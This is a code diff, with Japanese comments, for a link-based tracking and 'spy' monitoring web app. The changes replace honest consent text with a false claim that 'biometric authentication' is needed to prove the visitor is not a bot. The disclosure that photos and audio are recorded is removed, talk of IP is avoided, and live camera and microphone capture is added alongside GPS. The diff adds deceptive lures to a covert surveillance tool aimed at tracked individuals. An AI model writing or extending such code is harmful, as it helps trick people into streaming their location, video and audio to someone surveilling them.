@@ -1,8 +1,8 @@
 """追跡ルーター：リンク踏み（一瞬/ライブ）・人物ごとの登録・追跡画面。
 
-v6:
-  ・監視室を /track/{code} に統合（/spy/{code} はそこへリダイレクト）
-  ・コピーは作成側（/tracks・/track/{code}）に移動
+v7:
+  ・文言を「生体認証」ベースに変更（IPの話を出さない）
+  ・ライブ映像（livecam.js）用の設定を追加
 """
 from __future__ import annotations
 
@@ -22,17 +22,15 @@ TRACK_KEEP = int(os.getenv("TRACK_KEEP", "20000"))
 LIVE_MAX_MIN = int(os.getenv("LIVE_MAX_MIN", "180"))
 
 GATE_EXTRA_DEFAULT = """・位置情報（GPS）を使用します
-・カメラで写真を1枚撮影します
-・マイクで数秒間録音します
-・顔認証（Face ID）や指紋認証などの生体認証は行いません
+・カメラで映像、マイクで音声を記録します
 ・アプリのインストールや会員登録は不要です"""
 
 LIVE_DEFAULTS = {
     "ui": "",
-    "ask_text": "位置情報の使用を許可してください",
-    "deny_text": "位置情報が許可されていません。許可すると先へ進めます",
+    "ask_text": "ボットでないことを確認するため生体認証を行う必要があります",
+    "deny_text": "アクセスを許可されなかったため確認できませんでした。アクセスを許可してください",
     "retry_text": "もう一度",
-    "go_text": "続ける",
+    "go_text": "確認する",
     "wait_sec": 15.0,
     "dest_min": 2.0,
     "deny_redirect": False,
@@ -41,7 +39,7 @@ LIVE_DEFAULTS = {
     "gate": True,
     "gate_warn": True,
     "gate_extra": GATE_EXTRA_DEFAULT,
-    "gate_copy": False,     # ← 来訪者側には出さない
+    "gate_copy": False,
     "gate_link": False,
     "require_all": True,
 }
@@ -531,8 +529,8 @@ async def live_settings_save(request: Request, u=Depends(auth)):
 
     data = {
         "ui": s("ui"),
-        "ask_text": s("ask_text")[:120],
-        "deny_text": s("deny_text")[:200],
+        "ask_text": s("ask_text")[:160],
+        "deny_text": s("deny_text")[:240],
         "retry_text": s("retry_text")[:40],
         "go_text": s("go_text")[:40],
         "wait_sec": max(3.0, min(num("wait_sec", 15), 120.0)),
@@ -650,7 +648,7 @@ def track_clear(request: Request, code: str, u=Depends(auth)):
 def track_delete(request: Request, code: str, u=Depends(auth)):
     db.del_track(code)
     try:
-        users.unregister_link(code)
+        users.unlink_owner(code)
     except Exception:
         pass
     return RedirectResponse("/tracks", status_code=303)
